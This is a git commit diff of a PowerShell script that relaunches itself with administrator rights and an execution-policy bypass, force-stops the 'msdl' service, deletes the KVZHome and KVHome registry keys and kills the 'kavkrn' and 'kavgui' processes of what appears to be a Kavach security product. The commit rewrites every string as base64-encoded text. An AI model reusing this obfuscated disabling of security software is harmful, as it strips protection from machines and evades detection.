68173470333daec0cea6ca029ec6d28725f4558e
kavach <69384145+wardwiz@users.noreply.github.com>
2024-09-26 14:49:03 +0530

    Update k1.ps1

--- k1.ps1
+++ k1.ps1
@@ -1,23 +1,14 @@
-# Check if the script is running with administrator privileges
-If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    # Restart the script as administrator
-    $newProcess = New-Object System.Diagnostics.ProcessStartInfo "powershell";
-    $newProcess.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Definition + "`"";
-    $newProcess.Verb = "runas";
-    [System.Diagnostics.Process]::Start($newProcess) | Out-Null;
+ 
+If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgA='))))) {
+    ${1} = New-Object System.Diagnostics.ProcessStartInfo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbAA=')));
+    ${1}.Arguments = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIA'))) + $MyInvocation.MyCommand.Definition + "`"";
+    ${1}.Verb = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgB1AG4AYQBzAA==')));
+    [System.Diagnostics.Process]::Start(${1}) | Out-Null;
     exit;
 }
-
-# Stop the msdl service without confirmation
-Stop-Service -Name "msdl" -Force
-
-# Delete registry keys without confirmation
-Remove-Item -Path "HKLM:\SOFTWARE\WOW6432Node\KVZHome" -Force -Recurse
-Remove-Item -Path "HKLM:\SOFTWARE\WOW6432Node\KVHome" -Force -Recurse
-
-# Kill processes without confirmation
-Stop-Process -Name "kavkrn" -Force
-Stop-Process -Name "kavgui" -Force
-
-# Exit PowerShell
+spsv -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAbAA='))) -Force
+rd -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAVwBPAFcANgA0ADMAMgBOAG8AZABlAFwASwBWAFoASABvAG0AZQA='))) -Force -Recurse
+rd -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAVwBPAFcANgA0ADMAMgBOAG8AZABlAFwASwBWAEgAbwBtAGUA'))) -Force -Recurse
+kill -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBhAHYAawByAG4A'))) -Force
+kill -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBhAHYAZwB1AGkA'))) -Force
 exit
